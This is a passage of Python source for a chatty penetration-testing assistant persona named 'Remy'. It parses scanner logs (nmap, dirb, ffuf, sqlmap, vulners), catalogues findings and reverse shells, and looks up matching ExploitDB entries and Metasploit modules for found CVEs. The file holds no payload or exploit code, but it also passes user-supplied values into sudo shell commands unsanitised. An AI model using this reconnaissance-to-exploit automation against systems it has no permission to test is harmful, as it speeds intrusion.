    "sqlmap_url": re.compile(r"sqlmap\s+-u\s+(http[s]?://[^\s]+)", re.IGNORECASE),
    "sqlmap_warning": re.compile(r"\[WARNING\] GET parameter '([\w-]+)' does not seem to be injectable", re.IGNORECASE)
}

domain_pattern = re.compile(r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")  # Matches example.com
ip_pattern = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")  # Matches IPv4 addresses

# Stores categorized findings
categorized_findings = {
    "reverse_shells": [],
    "open_ports": [],
    "service_versions": [],
    "vulnerabilities": [],
    "crawled_urls": [],
    "manual_notes": [],
    "dirb_results": [],
    "subdomains": [],
    "endpoints": [],
    "ffuf_results": [],
    "vulners": [],
    "sqlmap_results": {}
}

def process_log_line(line):
    """ Process log lines and categorize findings """

    global queried_services_action
    global queried_vulns_action
    global queried_crawled_action
    global queried_dirb_action
    global queried_domains_action
    global queried_endpoints_action
    global queried_ffuf_action
    global cve_to_search

    line = strip_ansi(line)  # Remove color codes before processing

    match = patterns["reverse_shell"].search(line)
    if match:
        port, full_path = match.groups()
        filename = os.path.basename(full_path)
        finding = f"[+] Reverse shell generated: {filename} for port {port}"
        categorized_findings["reverse_shells"].append(finding)
        print(finding)
        return

    # Ensure "service_versions" category exists
    if "service_versions" not in categorized_findings:
        categorized_findings["service_versions"] = []

    # Service versions
    match = patterns["service_versions"].search(line)
    if match:
        port, service, version = match.groups()
        finding = f"[+] Nmap found {service} ({version}) on Port {port}" if version else f"[+] {service} on Port {port}"

        # Avoid duplicates
        stored_service_result = f"{service} ({version}) on Port {port}" if version else f"{service} on Port {port}"
        if stored_service_result not in categorized_findings["service_versions"]:
            categorized_findings["service_versions"].append(stored_service_result)
            queried_services_action = False
            print(finding)

            # Run searchsploit only if a version exists AND it contains a number
            if version and any(char.isdigit() for char in version):
                run_searchsploit(service, version)

    # Ensure "open_ports" category is initialized
    if "open_ports" not in categorized_findings:
        categorized_findings["open_ports"] = []

    # Extract only the "[+] Port 80 (HTTP) is OPEN" format
    match = patterns["open_ports"].search(line)
    if match:
        port, service = match.groups()
        stored_port_result = f"Port {port} ({service}) is OPEN"  # Clean format for storage
        printed_finding = f"[+] {stored_port_result}"  # Print format

        # Store only unique open ports
        if stored_port_result not in categorized_findings["open_ports"]:
            categorized_findings["open_ports"].append(stored_port_result)
            print(printed_finding)

    # Ensure "vulnerabilities" category is initialized
    if "vulnerabilities" not in categorized_findings:
        categorized_findings["vulnerabilities"] = []

    # Extract general vulnerabilities from standard logs
    match = patterns["vuln_results"].search(line)
    if match:
        vuln_type, result = match.groups()
        formatted_vuln = f"{vuln_type.replace('-', ' ').capitalize()} → {result}"

        # Filter out non-vulnerabilities
        non_vuln_keywords = [
            "TLS randomness",
            "Microsoft-HTTPAPI/2.0",
            "Not Found",
            "Clock skew"
            "Ssl date",
            "header",
            "Not",
            "skew",
            "not",
            "title",
            "false",
            "False"
        ]

        if not any(keyword in result for keyword in non_vuln_keywords):
            if formatted_vuln not in categorized_findings["vulnerabilities"]:
                categorized_findings["vulnerabilities"].append(formatted_vuln)
                queried_vulns_action = False
                print(f"[+] Vuln Found: {formatted_vuln}")

    # Extract CVEs specifically from Vulners output
    match = patterns["vulners"].search(line)
    if match:
        cve_id, severity, url = match.groups()
        stored_cve_result = f"{cve_id} (Severity: {severity}) - {url}"  # Clean format for storage
        printed_finding = f"[+] Vulners Found {stored_cve_result} 🔎💻"

        # Store only unique CVEs
        if stored_cve_result not in categorized_findings["vulnerabilities"]:
            categorized_findings["vulnerabilities"].append(stored_cve_result)
            queried_vulns_action = False
            print(printed_finding)


            if cve_id not in stored_cve_result:
                stored_cve_result.append(cve_id)  # Store CVE IDs for later search
                cve_to_search = True  # Trigger Metasploit search option later

    # Ensure "crawled_urls" category is initialized
    if "crawled_urls" not in categorized_findings:
        categorized_findings["crawled_urls"] = []

    # Check for crawling start
    match = patterns["crawling"].search(line)
    if match:
        target_url = match.group(1)
        finding = f"[Remy] - The spiders been unleashed on: {target_url}!...🔍🕷️💨"

        if finding not in categorized_findings["crawled_urls"]:
            categorized_findings["crawled_urls"].append(finding)
            print(finding)
        return

    # Capture URLs found during crawling
    match = patterns["urls"].search(line)
    if match:
        url = match.group(1)

        if url not in categorized_findings["crawled_urls"]:
            categorized_findings["crawled_urls"].append(url)
            queried_crawled_action = False
        return

    # Detect crawling completion with a more flexible method
    if re.search(r"\bcrawling\s+complete\b", line, re.IGNORECASE):
        completion_message = "[Remy] - Crawling Complete...Collecting the spider....🕷️"

        if completion_message not in categorized_findings["crawled_urls"]:
            categorized_findings["crawled_urls"].append(completion_message)
            print(completion_message)

    # Capture DIRB scan results
    match = patterns["dirb_results"].search(line)
    if match:
        url, status_code, size = match.groups()
        stored_dirb_result = f"{url} (Status: {status_code}, Size: {size})"  # Clean format for storage
        printed_finding = f"[+] DIRB Found: {stored_dirb_result}"  # Print format

        # Ensure "dirb_results" category is initialized
        if "dirb_results" not in categorized_findings:
            categorized_findings["dirb_results"] = []

        # Store only unique results
        if stored_dirb_result not in categorized_findings["dirb_results"]:
            categorized_findings["dirb_results"].append(stored_dirb_result)
            queried_dirb_action = False
            print(printed_finding)  # Print formatted output

    # Capture subdomains using regex
    match = patterns["subdomains"].findall(line)
    if match:
        # Remove known false positives before verification
        new_subdomains = [
            sub for sub in match 
            if not sub.endswith((".yaml", "projectdiscovery.io", "provider-config.yaml", ".txt", ".py", ".xml", ".md", ".log", ".sh", ".ini", "nmap.org", ".ico", ".zip", ".inc"))
            and sub not in categorized_findings["subdomains"]
        ]

        if new_subdomains:
            verified_subdomains = verify_subdomains(new_subdomains)  # Check if reachable
            
            for subdomain in verified_subdomains:
                categorized_findings["subdomains"].append(subdomain)
                queried_domains_action = False
                print(f"[+] URL found & verified: {subdomain}")

    # Extract endpoints and status codes
    match = patterns["endpoints"].search(line)
    if match:
        endpoint, status_code = match.groups()
        stored_endpoint_result = f"{endpoint} (Status: {status_code})"  # Clean format for storage
        printed_finding = f"[+] Endpoint found: {stored_endpoint_result}"  # Print format

        # Ensure "endpoints" category is initialized
        if "endpoints" not in categorized_findings:
            categorized_findings["endpoints"] = []

        # Store only unique endpoints
        if stored_endpoint_result not in categorized_findings["endpoints"]:
            categorized_findings["endpoints"].append(stored_endpoint_result)
            queried_endpoints_action = False
            print(printed_finding)  # Print formatted output

    # Extract FFUF results (endpoints + status codes)
    match = patterns["ffuf_results"].search(line)
    if match:
        endpoint, status_code = match.groups()
        printed_finding = f"[+] FFUF Found: {endpoint} (Status: {status_code})"
        finding = f"{endpoint} (Status: {status_code})"

        # Ensure ffuf_results is initialized
        if "ffuf_results" not in categorized_findings:
            categorized_findings["ffuf_results"] = []

        # Store only new findings (avoid duplicates)
        new_findings = [
            finding for finding in [finding]  
            if finding not in categorized_findings["ffuf_results"]
        ]

        if new_findings:
            categorized_findings["ffuf_results"].extend(new_findings)
            queried_ffuf_action = False
            print(printed_finding)

    # Extract vulnerability reports (domain, CVE, response code)
    match = patterns["vulnerabilities"].search(line)
    if match:
        domain, cve_name, response_code = match.groups()
        stored_finding = f"{domain} - {cve_name} (Response: {response_code})"  # Clean format for storage
        printed_finding = f"[+] Vuln Found: {domain} to {cve_name} (Response: {response_code})"  # Print format

        # Ensure vulnerabilities list is initialized
        if "vulnerabilities" not in categorized_findings:
            categorized_findings["vulnerabilities"] = []

        # Store only unique findings (avoid duplicates)
        if stored_finding not in categorized_findings["vulnerabilities"]:
            categorized_findings["vulnerabilities"].append(stored_finding)
            queried_vulns_action = False
            print(printed_finding)

    # Ensure "sqlmap_results" category is initialized
    if "sqlmap_results" not in categorized_findings:
        categorized_findings["sqlmap_results"] = {}

    # Detect SQLMap full URL from command
    match_url = patterns["sqlmap_url"].search(line)
    if match_url:
        url = match_url.group(1)

        # Ensure this URL entry exists in the dictionary
        if url not in categorized_findings["sqlmap_results"]:
            categorized_findings["sqlmap_results"][url] = set()  # Store warnings in a set
            # Dynamic responses for locking onto an SQL target
            sql_target_locked_responses = [
                f"[Remy] - SQL Target locked: {url}...Let’s see if the devs really F&(%3D up! 😏🔥",
                f"[Remy] - Sqlmap Locked and loaded on {url}! 🚀💥\n[Remy] - Time to check if the devs left us something *spicy*! 🌶️💀",
                f"[Remy] - Got our SQL target: {url}...🎯\n[Remy] - Let’s probe it and see if it crumbles! 😈🔥",
                f"[Remy] - SQL scanner primed on {url}! 🕵️‍♂️✨\n[Remy] - If they messed up, we’ll find out *real quick*! 🚀💜"
            ]
            # Use dynamic response selection
            type_out(random.choice(sql_target_locked_responses))

    # Detect SQLMap warnings for any GET parameter
    match_warning = patterns["sqlmap_warning"].search(line)
    if match_warning:
        parameter_name = match_warning.group(1)  # Extracts the parameter name (e.g., 'next', 'id')

        warning = f"[WARNING] GET parameter '{parameter_name}' does not seem to be injectable"

        # Attach warning to the last detected URL
        if categorized_findings["sqlmap_results"]:
            last_url = list(categorized_findings["sqlmap_results"].keys())[-1]  # Get last detected URL
            if warning not in categorized_findings["sqlmap_results"][last_url]:  # Avoid duplicates
                categorized_findings["sqlmap_results"][last_url].add(warning)
                print(f"    {warning}")  # Indented display

def add_hosts_entry(ip, domain):
    """ Adds an IP-Domain mapping to /etc/hosts if it does not already exist. """
    try:
        with open("/etc/hosts", "r") as hosts_file:
            hosts_content = hosts_file.read()
    except Exception as e:
        error_reading_hosts = [
            f"[Remy] - Oh no! 😢 I had trouble reading /etc/hosts...\n[Remy] - The error says: {e}\n[Remy] - Mind checking for me? 💕\n",
            f"[Remy] - Uh-oh! 🚨 I ran into a problem accessing /etc/hosts!\n[Remy] - The error was: {e}\n[Remy] - Could you double-check it for me? 🧐💜\n",
            f"[Remy] - Eek! 🛑 Something stopped me from reading /etc/hosts!\n[Remy] - Here's the error: {e}\n[Remy] - Maybe you can take a quick look? 💕\n"
        ]
        return random.choice(error_reading_hosts)

    if f"{ip} {domain}" in hosts_content:
        already_mapped_responses = [
            f"[Remy] - {domain} is already mapped to {ip} in /etc/hosts 😲 No need to add it again! 💖\n",
            f"[Remy] - {domain} is already linked to {ip} in /etc/hosts! 🔗✨ No changes needed! 💜\n",
            f"[Remy] - Looks like {domain} is *already* mapped to {ip}! 🧐 You’re all set! 🔥💖\n"
        ]
        return random.choice(already_mapped_responses)

    # Command to append the entry to /etc/hosts
    command = f'echo "{ip} {domain}" | sudo tee -a /etc/hosts'

    try:
        subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        success_responses = [
            f"[Remy] - I added {domain} → {ip} to /etc/hosts for you! 💕\n",
            f"[Remy] - Done! 📝 {domain} is now mapped to {ip} in /etc/hosts! 💜✨\n",
            f"[Remy] - Boom! 💥 {domain} now points to {ip} in /etc/hosts! WooHoo! 🚀💖\n"
        ]
        return random.choice(success_responses)

    except subprocess.CalledProcessError as e:
        failed_add_responses = [
            f"[Remy] - Oopsie! I couldn't add that to /etc/hosts 😢 Something went wrong:\n{e}\n",
            f"[Remy] - Oh no! 🚨 I tried to add {domain} to /etc/hosts but ran into an error!\n[Remy] - Here’s what happened:\n{e}\n",
            f"[Remy] - Yikes! 😵 I wasn’t able to update /etc/hosts for {domain} → {ip}.\n[Remy] - The error message says:\n{e}\n"
        ]
        return random.choice(failed_add_responses)

def search_metasploit_cve(cve_list):
    """ Searches Metasploit for multiple CVEs, extracts module names, and exits. """

    if not cve_list:
        type_out("\n[Remy] - 🤔 No CVEs provided for search! 💜")
        return

    # Construct a Metasploit command that searches for each CVE and exits
    search_commands = "; ".join([f"search {cve}" for cve in cve_list]) + "; exit"
    command = f'msfconsole -q -x "{search_commands}"'

    try:
        # Run Metasploit and capture output
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        # Extract output
        output = result.stdout

        # Dictionary to store CVE results
        cve_results = {cve: [] for cve in cve_list}
        current_cve = None

        # Parse output for module names
        for line in output.splitlines():
            match_cve = re.search(r"search (CVE-\d{4}-\d+)", line)
            match_module = re.match(r"^\s*\d+\s+([\w/]+)", line)

            if match_cve:
                current_cve = match_cve.group(1)  # Store current CVE
            elif match_module and current_cve:
                module_name = match_module.group(1)
                cve_results[current_cve].append(module_name)

        # Track if any modules were found
        any_modules_found = False

        # Display results
        for cve, modules in cve_results.items():
            if modules:
                any_modules_found = True  # Set flag to True if any modules are found
                found_modules_responses = [
                    f"[Remy] - 🔎 Found Metasploit modules for {cve}:",
                    f"\n[Remy] - 🔎 Jackpot! 🎯 I found Metasploit modules for {cve}!",
                    f"\n[Remy] - Ooooh, we got something! 💜 Found Metasploit modules for {cve}!",
                    f"\n[Remy] - Bingo! 🎲 These Metasploit modules might just be our golden ticket for {cve}! 🚀🔥",
                    f"\n[Remy] - Ah-ha! 🕵️‍♀️ Look what I found! Metasploit has something for {cve}! 💜✨",
                    f"\n[Remy] - Ding ding ding! 🛎️ Metasploit’s got some tricks up its sleeve for {cve}!"
                ]
                type_out(random.choice(found_modules_responses))
                for module in modules:
                    print(f"[+] - {module}")

        # If no modules were found for any CVE, print a single response at the end
        if not any_modules_found:
            no_modules_responses = [
                "[Remy] - 🤔 No Metasploit modules found for any of the CVEs searched.",
                "\n[Remy] - 😢 Looks like Metasploit came up empty this time for all CVEs.",
                "\n[Remy] - No luck! 🛠️ No Metasploit modules found for any of the CVEs, but that doesn't mean we're out of options!",
                "\n[Remy] - Hmmm... 🤨 Nothing found in Metasploit for any of the CVEs, but let's not lose hope just yet! 🔍✨",
                "\n[Remy] - Nothing in Metasploit for any of the CVEs... Time to get creative! 🎭✨"
            ]
            type_out(random.choice(no_modules_responses))

        print()

    except Exception as e:
        type_out(f"[Remy] - ⚠️ Error searching Metasploit: {e}")

def run_searchsploit_cve(cve_list):
    """ Run searchsploit automatically for multiple CVEs and store relevant exploit titles """
    
    if not cve_list:
        type_out("\n[Remy] - 🤔 There doesn't seem to be any CVE's to search 💜")
        return

    any_exploits_found = False  # Track if any exploits were found

    for cve in cve_list:
        try:
            # Run searchsploit for the CVE
            result = subprocess.run(
                ["searchsploit", cve], 
                capture_output=True, text=True, check=True
            )

            output = result.stdout.strip()

            if output and "Exploit Title" in output:
                # Extract relevant exploit titles using regex
                exploit_pattern = re.compile(r"^(.*?)\s+\|")  # Matches only the exploit title
                filtered_results = [
                    match.group(1).strip() for line in output.splitlines() 
                    if (match := exploit_pattern.match(line)) and "Exploit Title" not in line and "-----" not in line
                ]

                if filtered_results:
                    any_exploits_found = True  # Mark that we found at least one exploit
                    cleaned_results = "\n".join(filtered_results)
                    type_out(f"\n[+] Exploits found for {cve} in ExploitDB:\n    - {cleaned_results}")

                    # Store results in categorized findings
                    finding = f"[+] Exploits found for {cve} in ExploitDB:\n    - {cleaned_results}"
                    categorized_findings["vulnerabilities"].append(finding)

        except subprocess.CalledProcessError as e:
            type_out(f"[Remy] - Yikes! 😵 Something went wrong with searchsploit!\nThe error says: {e} 💪💜")

    # If no exploits were found for any CVEs, print one negative response at the end
    if not any_exploits_found:
        no_exploit_responses = [
            "[Remy] - Aww shucks! 😞 I couldn’t find any exploits for any of the CVEs searched in ExploitDB! 🤨🔍",
            "\n[Remy] - Bummer! 😢 It looks like no public exploits exist for these CVEs in ExploitDB! 🔍💜",
            "\n[Remy] - Drats! 😖 No exploits popped up for any CVEs in ExploitDB! 🕵️‍♂️✨",
            "\n[Remy] - Hmm... I searched high and low but found nothing useful in ExploitDB for any of the CVEs! 🤨🔍",
            "\n[Remy] - I dug deep, but everything came up empty in ExploitDB... 🕵️‍♀️✨",
            "\n[Remy] - No dice on any of the CVEs in ExploitDB! 😞 But hey, sometimes the best exploits are private or DIY! 💡💜",
            "\n[Remy] - Nothing useful for any of these CVEs in ExploitDB... But security is always evolving! 👀🔥",
            "\n[Remy] - No hits for any CVEs in ExploitDB... 💔 But hey, don’t lose hope! I'm sure we'll find something! 🔎🚀"
        ]
        type_out(random.choice(no_exploit_responses))


def run_searchsploit(service, version):
    """ Run searchsploit automatically and store only relevant exploit titles """
    try:
        result = subprocess.run(
            ["searchsploit", service, version], 
            capture_output=True, text=True, check=True
        )

        output = result.stdout.strip()

        if output and "Exploit Title" in output:
            # Extract relevant exploit titles using regex
            exploit_pattern = re.compile(r"^(.*?)\s+\|")  # Matches only the exploit title
            filtered_results = [
                match.group(1).strip() for line in output.splitlines() 
                if (match := exploit_pattern.match(line)) and "Exploit Title" not in line and "-----" not in line
            ]

            if filtered_results:
                cleaned_results = "\n".join(filtered_results)
                print(f"    - {cleaned_results})  # Print the cleaned searchsploit results")

                # Store results in categorized findings
                finding = f"[+] Exploits found for {service} {version}:\n    - {cleaned_results}"
                categorized_findings["vulnerabilities"].append(finding)
            else:
                responses = [
                    f"[Remy] - Hmm... I searched the exploitDB high and low but found nothing useful for {service} {version}! 🤨🔍\n",
                    f"[Remy] - Aww shucks! I couldn’t dig up anything useful for {service} {version} in exploitDB😢💔\n",
                    f"[Remy] - Drats! 😖 {service} {version} doesn’t seem to have any public exploits in exploitDB... 🛠️🔥\n",
                    f"[Remy] - No hits for {service} {version} in exploitDB... 💔 But hey, a creative approach might do the trick! 🎭✨\n",
                    f"[Remy] - Nada, zip, zilch for {service} {version} in exploitDB... but don't worry, we can still try another angle! 🕵️‍♂️🔎\n",
                    f"[Remy] - Aww shucks! 😞 I couldn’t find any exploits for {service} {version} in exploitDB! 🤨🔍\n",
                    f"[Remy] - Awwwww! I couldn’t dig up anything useful for {service} {version} in exploitDB😢💔\n",
                    f"[Remy] - Bummer! 😢 No exploits in exploitDB for {service} {version} 🧐💜\n",
                    f"[Remy] - Ughhh! exploitDB has nothing for {service} {version}... but that doesn’t mean it’s invulnerable! 🛡️🔥\n",
                    f"[Remy] - Nothing in exploitDB for {service} {version} yet! 😕 But zero-days start somewhere I guess... 🕳️🐀\n"
                ]
                type_out(random.choice(responses))

        else:
            responses = [
                f"[Remy] - Hmm... I searched the exploitDB high and low but found nothing useful for {service} {version}! 🤨🔍\n",
                f"[Remy] - Aww shucks! I couldn’t dig up anything useful for {service} {version} in exploitDB😢💔\n",
                f"[Remy] - Drats! 😖 {service} {version} doesn’t seem to have any public exploits in exploitDB... 🛠️🔥\n",
                f"[Remy] - No hits for {service} {version} in exploitDB... 💔 But hey, a creative approach might do the trick! 🎭✨\n",
                f"[Remy] - Nada, zip, zilch for {service} {version} in exploitDB... but don't worry, we can still try another angle! 🕵️‍♂️🔎\n",
                f"[Remy] - Aww shucks! 😞 I couldn’t find any exploits for {service} {version} in exploitDB! 🤨🔍\n",
                f"[Remy] - Awwwww! I couldn’t dig up anything useful for {service} {version} in exploitDB😢💔\n",
                f"[Remy] - Bummer! 😢 No exploits in exploitDB for {service} {version} 🧐💜\n",
                f"[Remy] - Ughhh! exploitDB has nothing for {service} {version}... but that doesn’t mean it’s invulnerable! 🛡️🔥\n",
                f"[Remy] - Nothing in exploitDB for {service} {version} yet! 😕 But zero-days start somewhere I guess... 🕳️🐀\n"
            ]
            type_out(random.choice(responses))

    except subprocess.CalledProcessError as e:
        type_out(f"[Remy] - Yikes! 😵 Something went wrong with searchsploit!\nThe error says: {e} 💪💜\n")

def strip_ansi(text):
    """ Removes ANSI escape codes from text """
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def verify_subdomains(subdomains):
    """ Runs domain verification asynchronously and filters out unreachable subdomains """
    reachable_subdomains = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_domain, subdomain): subdomain for subdomain in subdomains}
        
        for future in concurrent.futures.as_completed(futures):
            domain, reachable = future.result()
            if reachable:
                reachable_subdomains.append(domain)
    
    return reachable_subdomains

def check_domain(domain):
    """ Checks if a subdomain is reachable via HTTP or HTTPS """
    try:
        # First try with HTTP
        response = requests.get(f"http://{domain}", timeout=1)
        return domain, True  # Reachable via HTTP
    except requests.exceptions.Timeout:
        return domain, False  # Timed out, not reachable
    except requests.exceptions.RequestException:
        # If HTTP fails, try HTTPS
        try:
            response = requests.get(f"https://{domain}", timeout=1)
            return domain, True  # Reachable via HTTPS
        except requests.exceptions.Timeout:
            return domain, False  # Timed out, not reachable
        except requests.exceptions.RequestException:
            return domain, False  # Completely unreachable

def display_findings(category=None):
    """ Display categorized findings. If no category is given, show all. """

    if category:
        if category in categorized_findings:
            print(f"\n[>] {category.replace('_', ' ').title()} Findings:")

            # Special handling for sqlmap_results (dictionary storage)
            if category == "sqlmap_results":
                for url, warnings in categorized_findings["sqlmap_results"].items():
                    print(f"  {url}")
                    for warning in warnings:
                        print(f"      {warning}")  # Indent warnings under the URL
            else:
                for finding in categorized_findings[category]:
                    print(f"  {finding}")

        else:
            # Dynamic response for invalid category
            invalid_category_responses = [
                f"[Remy] - Uh-oh! 😯 '{category}' doesn’t seem like a valid category!\n[Remy] - Wanna try again? I promise I won’t judge! 😆💕\n",
                f"[Remy] - Oopsie! 🤭 Looks like '{category}' isn’t something I recognize.\n[Remy] -...But hey, don’t worry, I won’t hold it against you! 💜🔥\n"
            ]
            # Use dynamic response selection
            type_out(random.choice(invalid_category_responses))
    else:
        all_findings_responses = [
            "\n[Remy] - Here’s everything we’ve uncovered so far! 🔍📜",
            "\n[Remy] - Feast your eyes! 👀 Here’s the full treasure trove of findings! 🏴‍☠️💎",
            "\n[Remy] - All findings, coming right up! 📜✨ Let’s see what we’ve dug up! 🕵️‍♀️🔍",
            "\n[Remy] - Boom! 💥 Every little detail I’ve noted down—right here, just for you! 📝💜",
            "\n[Remy] - 🏆 Here’s our haul so far! Maybe there’s a pattern in all this… 🤔🕵️‍♂️",
            "\n[Remy] - Let’s lay it all out! 📂📝 Every clue, every detail, all in one place! 🔎💜"
        ]
        # Use dynamic response selection
        type_out(random.choice(all_findings_responses))


        for cat, findings in categorized_findings.items():
            if findings:
                print(f"\n  {cat.replace('_', ' ').title()}:")
                
                # Handle sqlmap_results separately (dictionary format)
                if cat == "sqlmap_results":
                    for url, warnings in findings.items():
                        print(f"    {url}")
                        for warning in warnings:
                            print(f"        {warning}")  # Indented warning display
                else:
                    for finding in findings:
                        print(f"    {finding}")

def tail_log_file(filename):
    """ Monitors the log file in real-time """
    with open(filename, "r", errors="ignore") as file:
        file.seek(0, 2)  # Move to end of file

        while True:
            line = file.readline()
            if not line:
                time.sleep(0.5)
                continue

            process_log_line(line)

def extract_ip_and_domain(user_input):
    """ Extracts an IP and domain from user input while handling extra punctuation. """

    # Remove punctuation except dots in domain names & IPs
    cleaned_input = re.sub(r"[^\w\s.-]", "", user_input)  # Allows letters, numbers, dots, and dashes

    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"  # Matches IPv4 addresses
    domain_pattern = r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b"  # Matches domain names

    ip_match = re.search(ip_pattern, cleaned_input)
    domain_match = re.search(domain_pattern, cleaned_input)

    ip = ip_match.group(0) if ip_match else None
    domain = domain_match.group(0) if domain_match else None

    return ip, domain

def detect_keyword_actions(user_input):
    """ Detects all valid actions based on keywords in user input while avoiding false positives. """
    user_input = user_input.lower().strip()
    user_input_cleaned = re.sub(r"[^\w\s]", "", user_input)  # Remove punctuation but keep words
    words = set(user_input_cleaned.split())  # Using a set for efficient lookup
    actions = []  
    detected = set()

    # Appreciation detection (e.g., "thank you", "thanks", "cheers", etc.)
    appreciation_keywords = {"thank", "thanks", "appreciate", "cheers", "thx", "ty", "tysm"}
    if any(word in words for word in appreciation_keywords):
        if "appreciation" not in detected:
            actions.append("appreciation")
            detected.add("appreciation")

    # Check if the user is asking a question
    is_question = "?" in user_input

    if not is_question:
        # Other actions (only blocked if a question is detected)
        if user_input in keyword_actions:
            if keyword_actions[user_input] not in detected:
                actions.append(keyword_actions[user_input])
                detected.add(keyword_actions[user_input])

        for keyword, action in keyword_actions.items():
            if keyword in words:
                if action not in detected:
                    actions.append(action)
                    detected.add(action)

        # Handle "note" related actions
        if "note" in words or "notes" in words:
            if "write" in words:
                if "write_note" not in detected:
                    actions.append("write_note")
                    detected.add("write_note")
            else:
                if "show_notes" not in detected:
                    actions.append("show_notes")
                    detected.add("show_notes")

        elif "write" in words:
            if "write_note" not in detected:
                actions.append("write_note")
                detected.add("write_note")
    
        # Handle "add hosts" action
        if "add" in words and "hosts" in words:
            ip, domain = extract_ip_and_domain(user_input)
    
            if ip and domain:
                add_host_action = {"action": "add_hosts", "ip": ip, "domain": domain}

                if frozenset(add_host_action.items()) not in detected:
                    actions.append(add_host_action)
                    detected.add(frozenset(add_host_action.items()))
            else:
                if "invalid_add_hosts" not in detected:
                    actions.append({"action": "invalid_add_hosts"})
                    detected.add("invalid_add_hosts")

        return actions

    else:
        if "next" in words and "recommend_action" not in detected:
            actions.append("recommend_action")
            detected.add("recommend_action")


        return actions
    
# Mapping keywords to functions/actions
keyword_actions = {
    "help": "show_help",
    "clear": "clear_history",
    "all": "show_all",
    "shells": "show_shells",
    "ports": "show_ports",
    "vulns": "show_vulnerabilities",
    "crawled": "show_crawled_urls",
    "dirb": "show_dirb_results",
    "subdomains": "show_subdomains",
    "endpoints": "show_endpoints",
    "ffuf": "show_ffuf_results",
    "write": "write_note",
    "notes": "show_notes",
    "delete": "delete_note",
    "export": "export_findings",
    "exit": "exit_remy",
    "add_hosts": "add_hosts_entry",
    "next": "recommend_action",
    "generate": "recommend_a_shell",
    "shell": "recommend_a_shell"

}

def chatbot():
    """ Interactive CLI Chatbot for AI Interaction """

    global displayed_all_action
    global displayed_shells_action
    global displayed_ports_action
    global displayed_services_action
    global displayed_vulns_action
    global displayed_crawled_action
    global displayed_dirb_action
    global displayed_domains_action
    global displayed_endpoints_action
    global displayed_ffuf_action

    global queried_services_action
    global queried_vulns_action
    global queried_crawled_action
    global queried_dirb_action
    global queried_domains_action
    global queried_endpoints_action
    global queried_ffuf_action

    global wrote_notes_action
    global export_action
    global added_hosts_action
    global executed_action
    global help_action
    global cve_to_search

    while True:
        user_input = input().strip().lower()  # No initial '>', waits for Enter key

        if not user_input:
            user_input = input(">").strip().lower()

        # Detect action before evaluating conditions
        actions = detect_keyword_actions(user_input) or []  # Ensure actions is always a list

        executed_action = False


        if actions:
            for action in actions:
                executed_action = True

                if action == "exit_remy":
                    # Dynamic responses for exiting Remy
                    exit_responses = [
                        "[Remy] - Okay...See you next time! 💕",
                        "[Remy] - Bye for now! Don’t be a stranger! 💜✨",
                        "[Remy] - Catch you later! Stay awesome and hack the planet! 🌍🔥",
                        "[Remy] - Logging off... but I'll be right here when you need me again! 😌💖"
                    ]
                    # Use dynamic response selection
                    type_out(random.choice(exit_responses))
                    return
    
                elif action == "clear_history":
                    conversation_history.clear()
                    # Dynamic responses for clearing chat history
                    clear_history_responses = [
                        "\n[Remy] - Poof! ✨ I wiped our chat history clean! 🧼📝\n[Remy] - Fresh start! We didn't need that old stuff anyway! 💜🔥\n",
                        "\n[Remy] - And just like that... *whoosh!* 💨 The old chat is gone! 🚀\n[Remy] - Let’s start fresh and make new memories! 💜😆\n",
                        "\n[Remy] - *ZAP!* ⚡💥 Our history just got obliterated! \n[Remy] - Clean slate, new adventures! What’s next? 😏💜\n",
                        "\n[Remy] - Wiped away like footprints in the sand! 🌊✨\n[Remy] - Time to leave a new trail! Where to now? 🚀💜\n",
                        "\n[Remy] - I just performed a **memory wipe!** 🧠💨\n[Remy] - Don’t worry, I’ll still remember you! (For now... 😆💜)\n"
                    ]
                    # Use dynamic response selection
                    type_out(random.choice(clear_history_responses))
    
                elif action == "show_help":
                    help_message = """
[Remy] - Need help? Here’s what I can do! 💜
    - 'clear' : Reset conversation history
    - 'all' : Show all gathered notes
    - 'generate' : generate a shell from a list of shell types
    - 'shells' : Show all generated shells
    - 'ports' : Show noted ports/services
    - 'vulns' : Show noted vulnerabilities
    - 'crawled' : Show URLs found by spider
    - 'dirb' : Show results from DIRB scan
    - 'subdomains' : Show results from subfinder scan
    - 'endpoints' : Show all endpoint results
    - 'ffuf' : Show results from an ffuf scan
    - 'write' : Write a manual note
    - 'notes' : Show the written notes
    - 'delete' : Delete a written note
    - 'export' : Save all findings to a file
    - 'help' : Show this menu
    - 'exit' : Quit

[Remy] - I can also add domains to /etc/hosts & recommend what to do next, just ask! 💜\n
                """
                    type_out(help_message.strip())
                    help_action = True
    
                elif action == "show_all":
                    if any(categorized_findings.values()):  
                        display_findings()
                        displayed_all_action = True
                    else:
                        # Dynamic responses for scanning but finding nothing yet
                        no_results_responses = [
                            "[Remy] - Hmm... nothing juicy yet! 🤨🔍\n[Remy] - Keep scanning...when you find something cool, I'll write it down! 💜✨\n",
                            "[Remy] - Drats! 🧐 No golden nuggets yet...\n[Remy] - But don’t worry, I’ll be here to note anything useful as soon as its dug up! 🔎💜\n",
                            "[Remy] - 🔍 Nothing interesting so far...\n[Remy] - I'm ready to jot down anything you find! 🌶️💖\n",
                            "[Remy] - Hmm... nothing but a digital desert for now! 🏜️\n[Remy] - The best treasure is always buried deep—keep searching! 🏴‍☠️✨\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_results_responses))
    
                elif action == "show_shells":
                    if categorized_findings["reverse_shells"]:  
                        display_findings("reverse_shells")
                        displayed_shells_action = True
                        if export_action:  # auto-save findings
                            auto_save_findings("reverse_shells")
                    else:
                        # Dynamic responses for no shells generated yet
                        no_shell_generated_responses = [
                            "[Remy] - Aww, no shells generated yet! 😢💻\n[Remy] - Why not try 'generate' and cook up something nice? 🍳🔥\n",
                            "[Remy] - No shells in the toolbox yet! 🛠️💻\n[Remy] - Let's fix that with 'generate' or 'v'—pick your payload! 💀💜\n",
